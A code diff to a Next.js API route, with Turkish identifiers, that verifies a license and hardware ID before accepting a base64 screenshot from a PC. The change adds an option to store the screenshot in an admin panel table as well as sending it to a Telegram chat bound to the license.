@@ -28,13 +28,9 @@ export async function POST(req) {
     const l = await lisansDogrula(g.anahtar, g.hwid);
     if (!l) return NextResponse.json({ ok: false, sebep: 'gecersiz' }, { status: 401 });
 
+    const hwid = String(g.hwid || '').toUpperCase();
     const chatId = String(g.chat_id || '');
-    if (!chatId) return NextResponse.json({ ok: false, sebep: 'chat_yok' }, { status: 400 });
-
-    // chat_id gercekten bu lisansa bagli mi? (rastgele kisiye resim yollanmasin)
-    const { rows } = await sql`
-      SELECT 1 FROM tg_baglar WHERE chat_id = ${chatId} AND lisans_id = ${l.id} LIMIT 1`;
-    if (!rows.length) return NextResponse.json({ ok: false, sebep: 'yetkisiz' }, { status: 403 });
+    const hedef = String(g.hedef || '');
 
     // Base64 / dataURI coz
     let b64 = String(g.resim || '');
@@ -45,8 +41,24 @@ export async function POST(req) {
     if (!buf.length || buf.length > 10 * 1024 * 1024) {
       return NextResponse.json({ ok: false, sebep: 'boyut' }, { status: 400 });
     }
-
     const pc = String(g.pc || '').slice(0, 60);
+
+    // ADMIN PANELI hedefi: goruntu Telegram'a degil, admin_ekran tablosuna yazilir.
+    if (!chatId && hedef === 'admin') {
+      await sql`
+        INSERT INTO admin_ekran (lisans_id, hwid, resim, zaman)
+        VALUES (${l.id}, ${hwid}, ${'data:image/jpeg;base64,' + b64}, NOW())
+        ON CONFLICT (lisans_id, hwid)
+        DO UPDATE SET resim = EXCLUDED.resim, zaman = NOW()`;
+      return NextResponse.json({ ok: true });
+    }
+
+    if (!chatId) return NextResponse.json({ ok: false, sebep: 'chat_yok' }, { status: 400 });
+    // chat_id gercekten bu lisansa bagli mi? (rastgele kisiye resim yollanmasin)
+    const { rows } = await sql`
+      SELECT 1 FROM tg_baglar WHERE chat_id = ${chatId} AND lisans_id = ${l.id} LIMIT 1`;
+    if (!rows.length) return NextResponse.json({ ok: false, sebep: 'yetkisiz' }, { status: 403 });
+
     const saat = new Date().toLocaleString('tr-TR', { dateStyle: 'short', timeStyle: 'short' });
     const r = await fotoGonder(chatId, buf, `📸 <b>${pc || 'PC'}</b> · ${saat}`);
     return NextResponse.json({ ok: !!(r && r.ok) });
